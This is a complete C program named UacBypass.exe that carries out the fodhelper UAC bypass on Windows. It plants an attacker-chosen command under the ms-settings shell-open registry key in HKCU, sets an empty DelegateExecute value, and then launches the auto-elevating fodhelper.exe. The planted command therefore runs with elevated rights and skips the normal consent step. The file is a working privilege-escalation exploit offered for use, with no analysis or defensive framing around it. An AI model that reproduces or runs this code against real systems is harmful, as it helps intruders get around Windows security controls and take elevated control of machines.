#include <windows.h>
#include <stdio.h>

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        wprintf(L"Usage: UacBypass.exe <file.exe or command>\n");
        return 1;
    }

    const wchar_t* userInput = argv[1];
    HKEY hkey;
    DWORD d;

    const wchar_t* settings = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const wchar_t* del = L"";

    // attempt to open the key
    LSTATUS stat = RegCreateKeyExW(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
    wprintf(stat != ERROR_SUCCESS ? L"Failed to open or create reg key\n" : L"Successfully created reg key\n");

    // set the registry values
    stat = RegSetValueExW(hkey, L"", 0, REG_SZ, (const BYTE*)userInput, (DWORD)((wcslen(userInput) + 1) * sizeof(wchar_t)));
    wprintf(stat != ERROR_SUCCESS ? L"Failed to set reg value\n" : L"Successfully set reg value\n");

    stat = RegSetValueExW(hkey, L"DelegateExecute", 0, REG_SZ, (const BYTE*)del, (DWORD)((wcslen(del) + 1) * sizeof(wchar_t)));
    wprintf(stat != ERROR_SUCCESS ? L"Failed to set reg value: DelegateExecute\n" : L"Successfully set reg value: DelegateExecute\n");

    // close the key handle
    RegCloseKey(hkey);

    // introduce a delay before executing fodhelper.exe
    Sleep(5000); 

    // start the fodhelper.exe program
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;

    if (!ShellExecuteExW(&sei)) {
        DWORD err = GetLastError();
        wprintf(err == ERROR_CANCELLED ? L"The user refused to allow privileges elevation.\n" : L"Unexpected error! Error code: %ld\n", err);
    }
    else {
        wprintf(L"Successfully created process\n");
    }

    return 0;
}
